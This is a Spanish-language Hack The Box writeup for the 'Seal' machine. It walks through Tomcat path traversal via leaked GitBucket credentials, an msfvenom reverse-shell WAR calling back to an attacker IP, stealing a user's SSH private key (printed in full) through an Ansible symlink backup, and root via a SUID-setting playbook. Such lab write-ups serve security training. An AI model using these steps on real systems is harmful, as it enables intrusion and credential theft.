+++
author = "Andrés Del Cerro"
title = "Hack The Box: Seal Writeup | Medium"
date = "2024-08-31"
description = ""
tags = [
    "HackTheBox",
    "Seal",
    "Writeup",
    "Cybersecurity",
    "Penetration Testing",
    "CTF",
    "Reverse Shell",
    "Privilege Escalation",
    "RCE",
    "Exploit",
    "Linux",
    "HTTPS Enumeration",
    "GitBucket Enumeration",
    "Information Leakage",
    "Path Traversal",
    "Evil WAR",
    "Abusing Ansible",
    "User Pivoting",
    "Abusing ansible-playbook"
]

+++

# Hack The Box: Seal Writeup

Welcome to my detailed writeup of the medium difficulty machine **"Seal"** on Hack The Box. This writeup will cover the steps taken to achieve initial foothold and escalation to root.

# TCP Enumeration

```console
$ rustscan -a 10.129.95.190 --ulimit 5000 -g
10.129.95.190 -> [22,443,8080]
```

```console
$ nmap -p22,443,8080 -sCV 10.129.95.190
Host is up (0.036s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 4b:89:47:39:67:3d:07:31:5e:3f:4c:27:41:1f:f9:67 (RSA)
|   256 04:a7:4f:39:95:65:c5:b0:8d:d5:49:2e:d8:44:00:36 (ECDSA)
|_  256 b4:5e:83:93:c5:42:49:de:71:25:92:71:23:b1:85:54 (ED25519)
443/tcp  open  ssl/http   nginx 1.18.0 (Ubuntu)
| tls-nextprotoneg: 
|_  http/1.1
|_http-server-header: nginx/1.18.0 (Ubuntu)
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
|_http-title: Seal Market
| ssl-cert: Subject: commonName=seal.htb/organizationName=Seal Pvt Ltd/stateOrProvinceName=London/countryName=UK
| Not valid before: 2021-05-05T10:24:03
|_Not valid after:  2022-05-05T10:24:03
8080/tcp open  http-proxy
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Server returned status 401 but no WWW-Authenticate header.
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 401 Unauthorized
|     Date: Sat, 31 Aug 2024 18:12:15 GMT
|     Set-Cookie: JSESSIONID=node014pxwi17vb5yf1qqcvvqltsts32.node0; Path=/; HttpOnly
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 0
|   GetRequest: 
|     HTTP/1.1 401 Unauthorized
|     Date: Sat, 31 Aug 2024 18:12:14 GMT
|     Set-Cookie: JSESSIONID=node01ewvnbws9hp3gt80lfdge53rt0.node0; Path=/; HttpOnly
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 0
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Sat, 31 Aug 2024 18:12:15 GMT
|     Set-Cookie: JSESSIONID=node05dbrzz6daw9s195w6gafkut001.node0; Path=/; HttpOnly
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Content-Type: text/html;charset=utf-8
|     Allow: GET,HEAD,POST,OPTIONS
|     Content-Length: 0
|   RPCCheck: 
|     HTTP/1.1 400 Illegal character OTEXT=0x80
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 71
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character OTEXT=0x80</pre>
|   RTSPRequest: 
|     HTTP/1.1 505 Unknown Version
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 58
|     Connection: close
|     <h1>Bad Message 505</h1><pre>reason: Unknown Version</pre>
|   Socks4: 
|     HTTP/1.1 400 Illegal character CNTL=0x4
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x4</pre>
|   Socks5: 
|     HTTP/1.1 400 Illegal character CNTL=0x5
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x5</pre>
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.94SVN%I=7%D=8/31%Time=66D3791C%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,F4,"HTTP/1\.1\x20401\x20Unauthorized\r\nDate:\x20Sat,\x2031
SF:\x20Aug\x202024\x2018:12:14\x20GMT\r\nSet-Cookie:\x20JSESSIONID=node01e
SF:wvnbws9hp3gt80lfdge53rt0\.node0;\x20Path=/;\x20HttpOnly\r\nExpires:\x20
SF:Thu,\x2001\x20Jan\x201970\x2000:00:00\x20GMT\r\nContent-Type:\x20text/h
SF:tml;charset=utf-8\r\nContent-Length:\x200\r\n\r\n")%r(HTTPOptions,108,"
SF:HTTP/1\.1\x20200\x20OK\r\nDate:\x20Sat,\x2031\x20Aug\x202024\x2018:12:1
SF:5\x20GMT\r\nSet-Cookie:\x20JSESSIONID=node05dbrzz6daw9s195w6gafkut001\.
SF:node0;\x20Path=/;\x20HttpOnly\r\nExpires:\x20Thu,\x2001\x20Jan\x201970\
SF:x2000:00:00\x20GMT\r\nContent-Type:\x20text/html;charset=utf-8\r\nAllow
SF::\x20GET,HEAD,POST,OPTIONS\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequ
SF:est,AD,"HTTP/1\.1\x20505\x20Unknown\x20Version\r\nContent-Type:\x20text
SF:/html;charset=iso-8859-1\r\nContent-Length:\x2058\r\nConnection:\x20clo
SF:se\r\n\r\n<h1>Bad\x20Message\x20505</h1><pre>reason:\x20Unknown\x20Vers
SF:ion</pre>")%r(FourOhFourRequest,F5,"HTTP/1\.1\x20401\x20Unauthorized\r\
SF:nDate:\x20Sat,\x2031\x20Aug\x202024\x2018:12:15\x20GMT\r\nSet-Cookie:\x
SF:20JSESSIONID=node014pxwi17vb5yf1qqcvvqltsts32\.node0;\x20Path=/;\x20Htt
SF:pOnly\r\nExpires:\x20Thu,\x2001\x20Jan\x201970\x2000:00:00\x20GMT\r\nCo
SF:ntent-Type:\x20text/html;charset=utf-8\r\nContent-Length:\x200\r\n\r\n"
SF:)%r(Socks5,C3,"HTTP/1\.1\x20400\x20Illegal\x20character\x20CNTL=0x5\r\n
SF:Content-Type:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2069\
SF:r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reaso
SF:n:\x20Illegal\x20character\x20CNTL=0x5</pre>")%r(Socks4,C3,"HTTP/1\.1\x
SF:20400\x20Illegal\x20character\x20CNTL=0x4\r\nContent-Type:\x20text/html
SF:;charset=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r\
SF:n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x20character
SF:\x20CNTL=0x4</pre>")%r(RPCCheck,C7,"HTTP/1\.1\x20400\x20Illegal\x20char
SF:acter\x20OTEXT=0x80\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\
SF:nContent-Length:\x2071\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Messag
SF:e\x20400</h1><pre>reason:\x20Illegal\x20character\x20OTEXT=0x80</pre>");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Aug 31 22:12:22 2024 -- 1 IP address (1 host up) scanned in 17.16 seconds
```

# UDP Enumeration

```console
$ sudo nmap --top-ports 1500 --min-rate 5000 -n -Pn 10.129.95.190 -sU -oN allPorts.UDP
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-31 22:14 CEST
Nmap scan report for 10.129.95.190
Host is up (0.53s latency).
Not shown: 1494 open|filtered udp ports (no-response)
PORT      STATE  SERVICE
3664/udp  closed ups-engine
5002/udp  closed rfe
30718/udp closed unknown
34433/udp closed unknown
49193/udp closed unknown
54321/udp closed bo2k

Nmap done: 1 IP address (1 host up) scanned in 3.10 seconds
```

Del escaneo inicial encontramos el dominio `seal.htb`, lo añadimos al `/etc/hosts`

Podemos inspeccionar el certificado SSL y encontramos que está emitido por una CA registrada al correo electrónico `admin@seal.htb`

```console
$ openssl s_client -showcerts -connect 10.129.95.190:443
```

# HTTPS Enumeration
`whatweb` no reporta nada interesante.

```console
$ whatweb https://seal.htb 
https://seal.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[admin@seal.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.129.95.190], JQuery[3.0.0], Script, Title[Seal Market], X-UA-Compatible[IE=edge], nginx[1.18.0]
```

Así se ve el sitio web, es un sitio web estático.
![Write-up Image](images/Screenshot_1.png)

Anteriormente se nos reportaba un `nginx` pero también detectamos que se está utilizando un `Tomcat` por detrás. Por lo cual debe de existir una aplicación Java.
![Write-up Image](images/Screenshot_2.png)

Fuzzeando el sitio web encontramos una ruta `/manager/html` típica de `tomcat` pero no nos pide ninguna autenticación.
![Write-up Image](images/Screenshot_3.png)

Podemos hacer un pequeño path traversal ya que existen algunas aplicaciones Tomcat que están mal configuradas y nos permite acceder a recursos protegidos con el path `/..;/`

Probando credenciales por defecto no conseguí nada.
![Write-up Image](images/Screenshot_4.png)
# 8080/TCP Enumeration

Vemos una instancia de `GitBucket`
![Write-up Image](images/Screenshot_5.png)

Podemos crearnos una cuenta bajo `/register`
![Write-up Image](images/Screenshot_6.png)

Una vez iniciado sesión vemos dos repositorios.
![Write-up Image](images/Screenshot_7.png)

Vemos una Issue abierta donde descubrimos dos usuarios, `alex` y `luis`
![Write-up Image](images/Screenshot_8.png)

Revisando la configuración de `nginx` a través del repositorio vemos las rutas `/manager/html` que ya hemos visto, `/admin/dashboard` que revisando el código vemos que nos redirecciona a un sitio estático y `/host-manager/html` 
![Write-up Image](images/Screenshot_12.png)

Aprovechando el Path Traversal encontrado anteriormente podemos ver el panel y efectivamente es estático.
![Write-up Image](images/Screenshot_13.png)

Y la ruta `/host-manager/html` es correspondiente al `Tomcat Virtual Host Manager`
## Information Leakage

Vemos un commit que pone `Adding tomcat configuration` y acto seguido otro commit actualizandola.
![Write-up Image](images/Screenshot_10.png)

Investigando este commit, en el archivo `tomcat-users.xml` nos encontramos una credencial.
![Write-up Image](images/Screenshot_9.png)

Aprovechando esta fuga de información en el commit mas el Path Traversal podemos iniciar sesión en el panel de tomcat.
![Write-up Image](images/Screenshot_11.png)

También en el VHost manager.
![Write-up Image](images/Screenshot_14.png)

# Foothold
Ahora que tenemos acceso al panel de Tomcat podemos hacer la típica intrusión generando un .war malicioso y consiguiendo una consola.

Generamos el .war malicioso con `msfvenom`
```console
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.66 LPORT=443 -f war -o revshell.war
Payload size: 1104 bytes
Final size of war file: 1104 bytes
Saved as: revshell.war
```

Al intentar subir el .war vemos lo siguiente.
![Write-up Image](images/Screenshot_15.png)

Probé con esta manera para hacer el Path Traversal.
![Write-up Image](images/Screenshot_16.png)

Y de esta manera si que podemos subir el .war malicioso.
![Write-up Image](images/Screenshot_17.png)


Ahora simplemente nos ponemos en escucha con `pwncat-cs` por el puerto 443.
```console
$ sudo pwncat-cs -lp 443
```

Y accedemos a `https://seal.htb/revshell/`
![Write-up Image](images/Screenshot_18.png)

Y vemos que ganamos acceso a la máquina.
```console
(remote) tomcat@seal:/var/lib/tomcat9$ whoami
tomcat
```

# User Pivoting

Vemos al usuario `luis`
```console
(remote) tomcat@seal:/var/lib/tomcat9$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
luis:x:1000:1000:,,,:/home/luis:/bin/bash
```

Podemos probar la credencial que tenemos para `luis` pero no hay suerte.
```console
(remote) tomcat@seal:/var/lib/tomcat9$ su luis
Password: 
su: Authentication failure
```

Al pasar el `linpeas.sh` vemos lo siguiente.

![Write-up Image](images/Screenshot_19.png)

Parece que hay una especie de servicio de backup que realiza backups en `/opt/backups`

```console
(remote) tomcat@seal:/opt/backups$ ls -la
total 16
drwxr-xr-x 4 luis luis 4096 Aug 31 19:09 .
drwxr-xr-x 3 root root 4096 May  7  2021 ..
drwxrwxr-x 2 luis luis 4096 Aug 31 19:10 archives
drwxrwxr-x 2 luis luis 4096 May  7  2021 playbook
```

Además vemos un directorio `playbook` que contiene un fichero `run.yml`
```yml
- hosts: localhost
  tasks:
  - name: Copy Files
    synchronize: src=/var/lib/tomcat9/webapps/ROOT/admin/dashboard dest=/opt/backups/files copy_links=yes
  - name: Server Backups
    archive:
      path: /opt/backups/files/
      dest: "/opt/backups/archives/backup-{{ansible_date_time.date}}-{{ansible_date_time.time}}.gz"
  - name: Clean
    file:
      state: absent
      path: /opt/backups/files/
```

Este archivo `run.yml` es un playbook de Ansible que realiza tres tareas principales.

1. **Copiar archivos**:
    
    - Copia el contenido del directorio `/var/lib/tomcat9/webapps/ROOT/admin/dashboard` al directorio `/opt/backups/files` en el mismo sistema.
    - Si hay enlaces simbólicos en el directorio de origen, también se copian (gracias a `copy_links=yes`).
2. **Hacer un backup**:
    
    - Crea un archivo comprimido (formato `.gz`) con el contenido del directorio `/opt/backups/files/`.
    - El archivo de backup se guarda en `/opt/backups/archives/` con un nombre que incluye la fecha y la hora actuales (utilizando las variables `{{ansible_date_time.date}}` y `{{ansible_date_time.time}}`).
3. **Limpiar**:
    
    - Elimina el directorio `/opt/backups/files/` y su contenido.

Viendo la opción de `copy_links` podríamos crear un enlace simbólico haciendo referencia a la clave privada de `luis` y ver si luego podemos leerla cuando se haga el backup.

Vemos que tenemos permiso de escritura en el directorio `uploads`
```console
(remote) tomcat@seal:/var/lib/tomcat9/webapps/ROOT/admin/dashboard$ ls -la
total 100
drwxr-xr-x 7 root root  4096 May  7  2021 .
drwxr-xr-x 3 root root  4096 May  6  2021 ..
drwxr-xr-x 5 root root  4096 Mar  7  2015 bootstrap
drwxr-xr-x 2 root root  4096 Mar  7  2015 css
drwxr-xr-x 4 root root  4096 Mar  7  2015 images
-rw-r--r-- 1 root root 71744 May  6  2021 index.html
drwxr-xr-x 4 root root  4096 Mar  7  2015 scripts
drwxrwxrwx 2 root root  4096 May  7  2021 uploads
```

```console
(remote) tomcat@seal:/var/lib/tomcat9/webapps/ROOT/admin/dashboard$ cd uploads
(remote) tomcat@seal:/var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads$ ls
(remote) tomcat@seal:/var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads$ touch test
(remote) tomcat@seal:/var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads$ ls
test
```

Creamos el enlace simbólico
```console
(remote) tomcat@seal:/var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads$ ln -s /home/luis/.ssh/id_rsa id_rsa
(remote) tomcat@seal:/var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads$ ls -la
total 8
drwxrwxrwx 2 root   root   4096 Aug 31 19:14 .
drwxr-xr-x 7 root   root   4096 May  7  2021 ..
lrwxrwxrwx 1 tomcat tomcat   22 Aug 31 19:14 id_rsa -> /home/luis/.ssh/id_rsa
-rw-r----- 1 tomcat tomcat    0 Aug 31 19:13 test
```

Cuando se hace el backup, nos copiamos el comprimido.
```console
(remote) tomcat@seal:/opt/backups/archives$ cp backup-2024-08-31-19:16:31.gz /tmp/2.gz
```

Lo extraemos.
```console
(remote) tomcat@seal:/tmp$ tar -xvf 2.gz                                                                                                                                                                                                         
dashboard/                                                                                                                                                                                                                                    
dashboard/scripts/                                                                                                                                                                                                                            
dashboard/images/                                                                                                                                                                                                                             
dashboard/css/                                                                                                                                                                                                                                
dashboard/uploads/                                                                                                                                                                                                                            
dashboard/bootstrap/                                                                                                                                                                                                                          
dashboard/index.html                                                                                                                                                                                                                          
dashboard/scripts/flot/                                                                                                                                                                                                                       
dashboard/scripts/datatables/                                                                                                                                                                                                                 
dashboard/scripts/jquery-ui-1.10.1.custom.min.js                                                                                                                                                                                              
dashboard/scripts/common.js                                                                                                                                                                                                                   
dashboard/scripts/jquery-1.9.1.min.js                                                                                                                                                                                                         
dashboard/scripts/flot/jquery.flot.resize.js                                                                                                                                                                                                  
dashboard/scripts/flot/jquery.flot.pie.js                                                                                                                                                                                                     
dashboard/scripts/flot/jquery.flot.js                                                                                                                                                                                                         
dashboard/scripts/datatables/jquery.dataTables.js                                                                                                                                                                                             
dashboard/images/jquery-ui/                                                                                                                                                                                                                   
dashboard/images/icons/                                                                                                                                                                                                                       
dashboard/images/img.jpg                                                                                                                                                                                                                      
dashboard/images/user.png                                                                                                                                                                                                                     
dashboard/images/bg.png                                                                                                                                                                                                                       
dashboard/images/jquery-ui/picker.png                                                                                                                                                                                                         
dashboard/images/icons/css/                                                                                                                                                                                                                   
dashboard/images/icons/font/                                                                                                                                                                                                                  
dashboard/images/icons/css/font-awesome.css                                                                                                                                                                                                   
dashboard/images/icons/font/fontawesome-webfont3294.ttf                                                                                                                                                                                       
dashboard/images/icons/font/fontawesome-webfontd41d.eot                                                                                                                                                                                       
dashboard/images/icons/font/fontawesome-webfont3294.eot                                                                                                                                                                                       
dashboard/images/icons/font/fontawesome-webfont3294.woff                                                                                                                                                                                      
dashboard/css/theme.css                                                                                                                                                                                                                       
dashboard/uploads/id_rsa                                                                                                                                                                                                                      
dashboard/bootstrap/css/                                                                                                                                                                                                                      
dashboard/bootstrap/js/                                                                                                                                                                                                                       
dashboard/bootstrap/img/                                                                                                                                                                                                                      
dashboard/bootstrap/css/bootstrap-responsive.min.css                                                                                                                                                                                          
dashboard/bootstrap/css/bootstrap.min.css                  
dashboard/bootstrap/js/bootstrap.min.js                    
dashboard/bootstrap/img/glyphicons-halflings.png                                                                       
dashboard/bootstrap/img/glyphicons-halflings-white.png     
```

Y podemos leer la clave privada.
```console
(remote) tomcat@seal:/tmp/dashboard/uploads$ cat id_rsa                                                                
-----BEGIN OPENSSH PRIVATE KEY-----                        
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn                                                 
NhAAAAAwEAAQAAAYEAs3kISCeddKacCQhVcpTTVcLxM9q2iQKzi9hsnlEt0Z7kchZrSZsG                                                 
DkID79g/4XrnoKXm2ud0gmZxdVJUAQ33Kg3Nk6czDI0wevr/YfBpCkXm5rsnfo5zjEuVGo                                                 
MTJhNZ8iOu7sCDZZA6sX48OFtuF6zuUgFqzHrdHrR4+YFawgP8OgJ9NWkapmmtkkxcEbF4                                                 
n1+v/l+74kEmti7jTiTSQgPr/ToTdvQtw12+YafVtEkB/8ipEnAIoD/B6JOOd4pPTNgX8R                                                 
MPWH93mStrqblnMOWJto9YpLxhM43v9I6EUje8gp/EcSrvHDBezEEMzZS+IbcP+hnw5ela                                                 
duLmtdTSMPTCWkpI9hXHNU9njcD+TRR/A90VHqdqLlaJkgC9zpRXB2096DVxFYdOLcjgeN                                                 
3rcnCAEhQ75VsEHXE/NHgO8zjD2o3cnAOzsMyQrqNXtPa+qHjVDch/T1TjSlCWxAFHy/OI                                                 
PxBupE/kbEoy1+dJHuR+gEp6yMlfqFyEVhUbDqyhAAAFgOAxrtXgMa7VAAAAB3NzaC1yc2                                                 
EAAAGBALN5CEgnnXSmnAkIVXKU01XC8TPatokCs4vYbJ5RLdGe5HIWa0mbBg5CA+/YP+F6                                                 
56Cl5trndIJmcXVSVAEN9yoNzZOnMwyNMHr6/2HwaQpF5ua7J36Oc4xLlRqDEyYTWfIjru                                                 
7Ag2WQOrF+PDhbbhes7lIBasx63R60ePmBWsID/DoCfTVpGqZprZJMXBGxeJ9fr/5fu+JB                                                 
JrYu404k0kID6/06E3b0LcNdvmGn1bRJAf/IqRJwCKA/weiTjneKT0zYF/ETD1h/d5kra6                                                 
m5ZzDlibaPWKS8YTON7/SOhFI3vIKfxHEq7xwwXsxBDM2UviG3D/oZ8OXpWnbi5rXU0jD0                                                 
wlpKSPYVxzVPZ43A/k0UfwPdFR6nai5WiZIAvc6UVwdtPeg1cRWHTi3I4Hjd63JwgBIUO+                                                 
VbBB1xPzR4DvM4w9qN3JwDs7DMkK6jV7T2vqh41Q3If09U40pQlsQBR8vziD8QbqRP5GxK                                                 
MtfnSR7kfoBKesjJX6hchFYVGw6soQAAAAMBAAEAAAGAJuAsvxR1svL0EbDQcYVzUbxsaw                                                 
MRTxRauAwlWxXSivmUGnJowwTlhukd2TJKhBkPW2kUXI6OWkC+it9Oevv/cgiTY0xwbmOX                                                 
AMylzR06Y5NItOoNYAiTVux4W8nQuAqxDRZVqjnhPHrFe/UQLlT/v/khlnngHHLwutn06n                                                 
bupeAfHqGzZYJi13FEu8/2kY6TxlH/2WX7WMMsE4KMkjy/nrUixTNzS+0QjKUdvCGS1P6L                                                 
hFB+7xN9itjEtBBiZ9p5feXwBn6aqIgSFyQJlU4e2CUFUd5PrkiHLf8mXjJJGMHbHne2ru                                                 
p0OXVqjxAW3qifK3UEp0bCInJS7UJ7tR9VI52QzQ/RfGJ+CshtqBeEioaLfPi9CxZ6LN4S                                                 
1zriasJdAzB3Hbu4NVVOc/xkH9mTJQ3kf5RGScCYablLjUCOq05aPVqhaW6tyDaf8ob85q                                                 
/s+CYaOrbi1YhxhOM8o5MvNzsrS8eIk1hTOf0msKEJ5mWo+RfhhCj9FTFSqyK79hQBAAAA                                                 
wQCfhc5si+UU+SHfQBg9lm8d1YAfnXDP5X1wjz+GFw15lGbg1x4YBgIz0A8PijpXeVthz2                                                 
ib+73vdNZgUD9t2B0TiwogMs2UlxuTguWivb9JxAZdbzr8Ro1XBCU6wtzQb4e22licifaa                                                 
WS/o1mRHOOP90jfpPOby8WZnDuLm4+IBzvcHFQaO7LUG2oPEwTl0ii7SmaXdahdCfQwkN5                                                 
NkfLXfUqg41nDOfLyRCqNAXu+pEbp8UIUl2tptCJo/zDzVsI4AAADBAOUwZjaZm6w/EGP6                                                 
KX6w28Y/sa/0hPhLJvcuZbOrgMj+8FlSceVznA3gAuClJNNn0jPZ0RMWUB978eu4J3se5O                                                 
plVaLGrzT88K0nQbvM3KhcBjsOxCpuwxUlTrJi6+i9WyPENovEWU5c79WJsTKjIpMOmEbM                                                 
kCbtTRbHtuKwuSe8OWMTF2+Bmt0nMQc9IRD1II2TxNDLNGVqbq4fhBEW4co1X076CUGDnx                                                 
5K5HCjel95b+9H2ZXnW9LeLd8G7oFRUQAAAMEAyHfDZKku36IYmNeDEEcCUrO9Nl0Nle7b                                                 
Vd3EJug4Wsl/n1UqCCABQjhWpWA3oniOXwmbAsvFiox5EdBYzr6vsWmeleOQTRuJCbw6lc                                                 
YG6tmwVeTbhkycXMbEVeIsG0a42Yj1ywrq5GyXKYaFr3DnDITcqLbdxIIEdH1vrRjYynVM                                                 
ueX7aq9pIXhcGT6M9CGUJjyEkvOrx+HRD4TKu0lGcO3LVANGPqSfks4r5Ea4LiZ4Q4YnOJ                                                 
u8KqOiDVrwmFJRAAAACWx1aXNAc2VhbAE=                         
-----END OPENSSH PRIVATE KEY-----   
```

Ahora le podemos dar los permisos adecuados a la clave privada.
```console
$ chmod 600 id_rsa.luis
```

Y conectarnos vía SSH como `luis`

```console
$ ssh -i id_rsa.luis luis@seal.htb
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat 31 Aug 2024 07:20:35 PM UTC

  System load:           0.0
  Usage of /:            47.0% of 9.58GB
  Memory usage:          29%
  Swap usage:            0%
  Processes:             170
  Users logged in:       0
  IPv4 address for eth0: 10.129.95.190
  IPv6 address for eth0: dead:beef::250:56ff:fe94:47b7


22 updates can be applied immediately.
15 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sat Aug 31 19:19:41 2024 from 127.0.0.1
luis@seal:~$ id
uid=1000(luis) gid=1000(luis) groups=1000(luis)
```

Podemos leer la flag de usuario.
```console
luis@seal:~$ cat user.txt 
32a75c21bc5e8cf...
```

# Privilege Escalation
Luis puede ejecutar como el usuario que quiera y sin contraseña `ansible-playbook *`
```console
luis@seal:~$ sudo -l
Matching Defaults entries for luis on seal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User luis may run the following commands on seal:
    (ALL) NOPASSWD: /usr/bin/ansible-playbook *
```

Podemos utilizar esto para crear un playbook malicioso para ejecutar un comando a nivel de sistema y de esta forma escalar privilegios.

Podemos ver los permisos de `/bin/bash`
```console
luis@seal:~$ ls -la /bin/bash                                                             
-rwxr-xr-x 1 root root 1183448 Jun 18  2020 /bin/bash
```

Podemos crear un pequeño playbook para ejecutar el comando `chmod u+s /bin/bash` a nivel de sistema y asignar el bit SUID a `/bin/bash` para poder lanzarnos una `bash` como `root
`
```yml
---
- hosts: localhost
  become: yes
  tasks:
    - name: Establecer el bit SUID en /bin/bash
      command: chmod u+s /bin/bash
```

Y ahora simplemente queda ejecutarlo.
```console
luis@seal:~$ sudo /usr/bin/ansible-playbook test.yml 
[WARNING]: provided hosts list is empty, only localhost is available. Note that the
implicit localhost does not match 'all'

PLAY [localhost] *************************************************************************

TASK [Gathering Facts] *******************************************************************
ok: [localhost]

TASK [Establecer el bit SUID en /bin/bash] ***********************************************
[WARNING]: Consider using the file module with mode rather than running 'chmod'.  If you
need to use command because file is insufficient you can add 'warn: false' to this
command task or set 'command_warnings=False' in ansible.cfg to get rid of this message.
changed: [localhost]

PLAY RECAP *******************************************************************************
localhost                  : ok=2    changed=1    unreachable=0    failed=0    skipped=0    rescued=0    ignored=0   

luis@seal:~$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1183448 Jun 18  2020 /bin/bash
```

Y ahora con `bash -p` vemos que conseguimos una `bash` con el `euid` 0, es decir, `root`
```console
luis@seal:~$ bash -p
bash-5.0# id
uid=1000(luis) gid=1000(luis) euid=0(root) groups=1000(luis)
```

Y ya podemos dirigirnos a `/root` y leer la flag de `root`
```console
bash-5.0# cat root.txt 
a7eea3c65bacb...
```

¡Y ya estaría!

Happy Hacking! 🚀